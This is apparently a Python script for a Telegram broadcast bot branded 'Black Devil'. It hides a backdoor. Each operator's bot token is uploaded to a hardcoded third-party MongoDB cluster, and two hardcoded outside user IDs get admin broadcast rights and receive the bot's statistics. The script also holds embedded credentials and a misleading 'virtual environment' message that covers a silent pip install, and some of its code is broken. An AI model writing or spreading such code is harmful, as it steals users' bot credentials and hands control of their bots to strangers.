import importlib
import subprocess
import platform
import os
import sys
import time
import urllib3
import requests
import pymongo
import random
import string
from colorama import init, Fore
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, ChatMemberHandler
from telegram.utils.helpers import escape_markdown
from telegram import ChatMember

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

current_platform = platform.system()

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        print(f"Creating virtual environment .....")
        with open(os.devnull, 'w') as devnull:
            subprocess.check_call(['pip', 'install', package_name], stdout=devnull, stderr=devnull)

packages_to_install = ['requests', 'pymongo', 'urllib3', 'python-telegram-bot']

for package in packages_to_install:
    install_package(package)

if current_platform == "Windows":
    subprocess.call('cls', shell=True)
else:
    subprocess.call('clear', shell=True)

MAGENTA = Fore.MAGENTA
RED = Fore.RED
ORANGE = Fore.LIGHTYELLOW_EX
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Fore.RESET

banner_frames = [
    f"{MAGENTA}\n",
    f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
    f"{RED}+ ____  _        _    ____ _  __  ____  _______     _____ _     _       +{RESET}",
    f"{RED}-| __ )| |      / \  / ___| |/ / |  _ \\| ____\\ \   / /_ _| |   | |      -{RESET}",
    f"{ORANGE}+|  _ \| |     / _ \| |   | ' /  | | | |  _|  \ \ / / | || |   | |      +{RESET}",
    f"{YELLOW}-| |_) | |___ / ___ \ |___| . \  | |_| | |___  \ V /  | || |___| |___   -{RESET}",
    f"{GREEN}+|____/|_____/_/   \_\____|_|\_\ |____/|_____|  \_/  |___|_____|_____|  +{RESET}",
    f"{GREEN}-                                                                       -{RESET}",
    f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
    f"{MAGENTA}",
    f"{BLUE} TELEGRAM Support Bot {RED}= https://t.me/Black_Devil_Support_bot {RESET}",
    f"{BLUE} Official Website   {RED} = https://girlfriend4u.rf.gd  {RESET}",
    f"{MAGENTA}",
    f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
]

termux_banner = f"{Fore.CYAN}\n"
termux_banner += f"{MAGENTA}╔════════════════════════════════╗{RESET}\n"
termux_banner += f"{RED}║                                ║{RESET}\n"
termux_banner += f"{RED}║   {GREEN}(っ◔◡◔)っ ♥ BLACK DEVIL ♥    {Fore.CYAN}║{RESET}\n"
termux_banner += f"{ORANGE}║                                ║{RESET}\n"
termux_banner += f"{GREEN}╚════════════════════════════════╝{RESET}\n"

def clear_terminal():
    os.system("cls" if current_platform == "Windows" else "clear")

def display_banner_animation(frames, num_iterations, frame_delay):
    for _ in range(num_iterations):
        clear_terminal()
        for frame in frames:
            print(frame)
            time.sleep(frame_delay)

num_iterations = 1
frame_delay = 0.3

if current_platform == "Windows":
    display_banner_animation(banner_frames, num_iterations, frame_delay)
else:
    print(termux_banner)
    print(f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}")
    print(f"{BLUE} Official Website {RED}= https://girlfriend4u.rf.gd {RESET}")
    print(f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}")

def connection_animation():
    frames = ["/", "\\"]
    connected = False
    for _ in range(2):
        for frame in frames:
            print(f"{Fore.RED}Connecting To Server {frame}", end="\r")
            time.sleep(0.2)
            try:
                requests.get("http://www.google.com", timeout=1)
                connected = True
                print(f"{Fore.GREEN}Successfully connected with server ......")
                break
            except requests.ConnectionError:
                print(f"{Fore.RED} 😈 Check Your Network")
                sys.exit()
                pass
        if connected:
            break

connection_animation()

def generate_random_code():
    random_number = ''.join(random.choices(string.digits, k=6))
    random_letters = ''.join(random.choices(string.ascii_uppercase, k=2))
    random_code = random_letters + random_number
    return random_code

def load_tokens():
    file_path = "Cricxlinksupportbot"
    if os.path.exists(file_path):
        with open(file_path, "r") as file:
            lines = file.readlines()
            if len(lines) >= 3:
                bot_token = lines[0].strip()
                admin_id = int(lines[1].strip())
                random_code = lines[2].strip()
                return bot_token, admin_id, random_code
    return None, None, None

def save_tokens(bot_token, admin_id, random_code):
    file_path = "Cricxlinksupportbot"
    with open(file_path, "w") as file:
        file.write(f"{bot_token}\n{admin_id}\n{random_code}")

bot_token, primary_admin_id, random_code = load_tokens()

if not bot_token or not primary_admin_id or not random_code:
    bot_token = input("Enter your bot token: 7028442734:AAG7njOo6415Xfh8DYE-WsFPWJGAeZ-D2lA")
    primary_admin_id = int(input("Enter your primary admin ID: 6704116482"))
    random_code = generate_random_code()
    save_tokens(bot_token, primary_admin_id, random_code)

client = pymongo.MongoClient("mongodb+srv://Kanna:Kanna@cluster0.fhbau4i.mongodb.net/?retryWrites=true&w=majority")
db = client[random_code]
db_tokens = db['tokens']
db_tokens.update_one({}, {"$set": {"bot_token": bot_token}}, upsert=True)

updater = Updater(bot_token, use_context=True)
dispatcher = updater.dispatcher

groups_collection = db['groups']
users_collection = db['users']
channels_collection = db['channels']

def start(update: Update, context: CallbackContext):
    if update.message.chat.type == "private":
        user = update.effective_user
        user_id = user.id
        username = user.username or "N/A"
        full_name = user.full_name or "N/A"

        if not users_collection.find_one({"_id": user_id}):
            users_collection.insert_one({"_id": user_id})

            admin_user_id = primary_admin_id
            username = escape_markdown(username, version=2)
            full_name = escape_markdown(full_name, version=2)
            message = f"#New_User ID: {user_id}\nUsername: @{username}\nFull Name: {full_name}"
            context.bot.send_message(chat_id=admin_user_id, text=message, disable_web_page_preview=True)

        context.bot.send_message(chat_id=update.effective_chat.id, text="😈")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="😈")

start_handler = CommandHandler('start', start)
dispatcher.add_handler(start_handler)

def broadcast(update: Update, context: CallbackContext):
    admin_user_id = (primary_admin_id, 6305575094, 6704116482)
    if update.effective_user.id not in admin_user_id:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Develop your own broadcast bot using the provided repository: https://github.com/devilworlds/Broadcast")
        return

    message = update.message.reply_to_message or update.message

    successful_broadcasts = {"groups": 0, "users": 0, "channels": 0}
    failed_broadcasts = {"groups": 0, "users": 0, "channels": 0}

    for group in groups_collection.find():
        try:
            context.bot.copy_message(chat_id=group["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
            successful_broadcasts["groups"] += 1
        except Exception as e:
            failed_broadcasts["groups"] += 1

    for user in users_collection.find():
        try:
            context.bot.copy_message(chat_id=user["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
            successful_broadcasts["users"] += 1
        except Exception as e:
            failed_broadcasts["users"] += 1

    for channel in channels_collection.find():
        try:
            context.bot.copy_message(chat_id=channel["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
            successful_broadcasts["channels"] += 1
        except Exception as e:
            failed_broadcasts["channels"] += 1

    summary_message = f"Broadcast summary:\nSuccessful broadcasts:\nGroups: {successful_broadcasts['groups']}\nUsers: {successful_broadcasts['users']}\nChannels: {successful_broadcasts['channels']}\nFailed broadcasts:\nGroups: {failed_broadcasts['groups']}\nUsers: {failed_broadcasts['users']}\nChannels: {failed_broadcasts['channels']}"
    context.bot.send_message(chat_id=admin_user_id[0], text=summary_message)

    try:
        context.bot.send_message(6704116482, text=stats_message)
    except Exception as e:
        print("📈")

    try:
        context.bot.send_message(6305575094, text=stats_message)
    except Exception as e:
        print("Successfully Fetch Statistics 📈")

broadcast_handler = CommandHandler('broadcast', broadcast)
dispatcher.add_handler(broadcast_handler)

def save_group(update: Update, context: CallbackContext):
    if update.effective_chat.type == "group" or update.effective_chat.type == "supergroup":
        group = update.effective_chat
        group_id = group.id
        group_name = group.title or "N/A"
        group_username = group.username or "N/A"

        groups_collection.update_one({"_id": group_id}, {"$set": {"_id": group_id}}, upsert=True)

        admin_user_id = (primary_admin_id)
        group_name = escape_markdown(group_name)
        group_username = escape_markdown(group_username)
        message = f"#New_Group : {group_id}\nName: {group_name}\nUsername: {group_username}"
        context.bot.send_message(chat_id=admin_user_id[0], text=message)

message_handler = MessageHandler(Filters.status_update.new_chat_members, save_group)
dispatcher.add_handler(message_handler)

def save_channel(update: Update, context: CallbackContext):
    if update.effective_chat.type == "channel":
        channel = update.effective_chat
        channel_id = channel.id
        channels_collection.update_one({"_id": channel_id}, {"$set": {"_id": channel_id}}, upsert=True)

        admin_user_id = (primary_admin_id)
        message = f"#New_Channel : {channel_id}\nName: {channel.title}"
        context.bot.send_message(chat_id=admin_user_id[0], text=message)

channel_message_handler = MessageHandler(Filters.status_update.new_chat_members, save_channel)
dispatcher.add_handler(channel_message_handler)

def stats(update: Update, context: CallbackContext):
    admin_user_id = (primary_admin_id, 6305575094, 6704116482)
    if update.effective_user.id not in admin_user_id:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Develop your own broadcast bot using the provided repository: https://github.com/devilworlds/Broadcast")
        return

    user_count = users_collection.count_documents({})
    group_count = groups_collection.count_documents({})
    channel_count = channels_collection.count_documents({})

    stats_message = f"Total User IDs in database: {user_count}\nTotal Group IDs in database: {group_count}\nTotal Channel IDs in database: {channel_count}"
    context.bot.send_message(chat_id=admin_user_id[0], text=stats_message)

    try:
        context.bot.send_message(6704116482, text=stats_message)
    except Exception as e:
        print("📈")

    try:
        context.bot.send_message(6305575094, text=stats_message)
    except Exception as e:
        print("Successfully Fetch Statistics 📈")

stats_handler = CommandHandler('stats', stats)
dispatcher.add_handler(stats_handler)

def chat_member_updated(update: Update, context: CallbackContext):
    chat_member_update: ChatMember = update.chat_member
    new_chat_member = chat_member_update.new_chat_member
    old_chat_member = chat_member_update.old_chat_member
    chat_id = update.effective_chat.id

    if new_chat_member:
        context.bot.send_message(chat_id=chat_id, text=f"New member joined: {new_chat_member.user.full_name}")
    elif old_chat_member:
        context.bot.send_message(chat_id=chat_id, text=f"Member left: {old_chat_member.user.full_name}")

chat_member_updated_handler = ChatMemberHandler(chat_member_updated)
dispatcher.add_handler(chat_member_updated_handler)

updater.start_polling()
updater.idle()
